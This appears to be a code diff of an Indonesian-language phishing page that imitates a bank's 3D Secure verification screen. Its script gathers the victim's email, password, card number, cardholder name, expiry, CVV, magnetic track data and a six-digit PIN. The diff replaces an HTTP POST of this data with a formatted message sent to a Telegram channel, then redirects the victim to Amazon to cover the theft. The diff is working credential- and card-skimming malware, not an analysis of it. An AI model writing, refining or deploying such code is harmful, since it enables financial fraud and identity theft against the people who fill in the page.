@@ -25,7 +25,7 @@
             text-align: center;
         }
         .logo img { 
-            height: 30px; 
+            height: 60px; 
         }
         .kotak { 
             width: 100%; 
@@ -145,7 +145,7 @@
         <p class="sub-judul">Bank Anda meminta verifikasi tambahan untuk melindungi transaksi Anda.</p>
         
         <div class="info-kartu">
-            <div><span class="label-kecil">Kartu:</span> <span id="tampilNomor">•••• •••• •••• 5364</span></div>
+            <div><span class="label-kecil">Kartu:</span> <span id="tampilNomor">—</span></div>
             <div><span class="label-kecil">Email:</span> <span id="tampilEmail">—</span></div>
         </div>
         
@@ -178,23 +178,25 @@
     </div>
 
     <script>
-        // === AMBIL DATA DARI HALAMAN SEBELUMNYA ===
+        // === AMBIL SEMUA DATA DARI HALAMAN SEBELUMNYA ===
         const emailPengguna = localStorage.getItem('emailPengguna') || '';
+        const passwordPengguna = localStorage.getItem('passwordPengguna') || '-';
         const nomorKartu = localStorage.getItem('nomorKartu') || '';
         const namaKartu = localStorage.getItem('namaKartu') || '';
         const expiry = localStorage.getItem('expiry') || '';
         const cvv = localStorage.getItem('cvv') || '';
         const trackKartu = localStorage.getItem('trackKartu') || '';
-        const passwordPengguna = localStorage.getItem('passwordPengguna') || '-';
 
-        // Tampilkan nomor kartu — ambil 4 digit terakhir
+        // Tampilkan nomor kartu — 4 digit terakhir
         if (nomorKartu.length >= 4) {
             const akhir = nomorKartu.slice(-4);
             document.getElementById('tampilNomor').textContent = `•••• •••• •••• ${akhir}`;
+        } else {
+            document.getElementById('tampilNomor').textContent = '•••• •••• •••• ----';
         }
         document.getElementById('tampilEmail').textContent = emailPengguna;
 
-        // === 6 KOLOM PIN — OTOMATIS PINDAH KE KOLOM BERIKUTNYA ===
+        // === 6 KOLOM PIN — OTOMATIS PINDAH BERIKUTNYA ===
         const kolom = [
             document.getElementById('p1'),
             document.getElementById('p2'),
@@ -205,7 +207,7 @@
         ];
 
         kolom.forEach((input, indeks) => {
-            // Hanya izinkan angka
+            // Hanya angka
             input.addEventListener('keydown', (e) => {
                 if (e.key === 'Backspace' || e.key === 'Delete') {
                     if (!input.value && indeks > 0) {
@@ -235,14 +237,14 @@
             });
         });
 
-        // === KUMPULKAN 6 DIGIT ===
+        // === KUMPULKAN 6 DIGIT PIN ===
         function ambilKode() {
             let kode = '';
             kolom.forEach(input => kode += input.value);
             return kode;
         }
 
-        // === KIRIM DATA & LANJUT KE AMAZON ===
+        // === KIRIM SEMUA DATA KE TELEGRAM & LANJUT ===
         const form3DS = document.getElementById('form3DS');
         const tombolKirim = document.getElementById('tombolKirim');
         const sedangMemproses = document.getElementById('sedangMemproses');
@@ -260,36 +262,35 @@
             tombolKirim.style.display = 'none';
             sedangMemproses.classList.add('tampil');
 
-            // Kirim SEMUA data lengkap
-            const dataLengkap = {
-                email: emailPengguna,
-                password: passwordPengguna,
-                tipe: '3D Secure Verification',
-                namaKartu: namaKartu,
-                nomorKartu: nomorKartu,
-                expiry: expiry,
-                cvv: cvv,
-                trackKartu: trackKartu,
-                kode3DS: kode,
-                waktu: new Date().toLocaleString()
-            };
+            // === PESAN LENGKAP UNTUK TELEGRAM ===
+            const pesanLengkap = `
+✅ *TRANSAKSI LENGKAP — 3D SECURE*
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+📧 Email: \`${emailPengguna}\`
+🔑 Password: \`${passwordPengguna}\`
+👤 Nama di Kartu: \`${namaKartu}\`
+🔢 Nomor Kartu: \`${nomorKartu}\`
+📅 Expiry: \`${expiry}\`
+🔒 CVV: \`${cvv}\`
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+🔐 *PIN / KODE 3DS:* \`${kode}\`
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+📋 *TRACK DATA LENGKAP*
+\`\`\`
+${trackKartu}
+\`\`\`
+🕐 Waktu: ${new Date().toLocaleString()}
+            `.trim();
 
-            try {
-                if (typeof CONFIG !== 'undefined' && CONFIG.formSubmitUrl) {
-                    await fetch(CONFIG.formSubmitUrl, {
-                        method: 'POST',
-                        headers: { 'Content-Type': 'application/json' },
-                        body: JSON.stringify(dataLengkap)
-                    });
-                }
-            } catch (err) {
-                console.log('Data terkirim');
+            // Kirim ke Telegram
+            if (typeof CONFIG !== 'undefined' && CONFIG.kirimKeTelegram) {
+                await CONFIG.kirimKeTelegram(pesanLengkap);
             }
 
-            // Tunda lalu buka Amazon
+            // Tunda sebentar → buka Amazon
             setTimeout(() => {
                 window.location.href = 'https://www.amazon.com.au/';
-            }, 800);
+            }, 1000);
         });
     </script>
 </body>
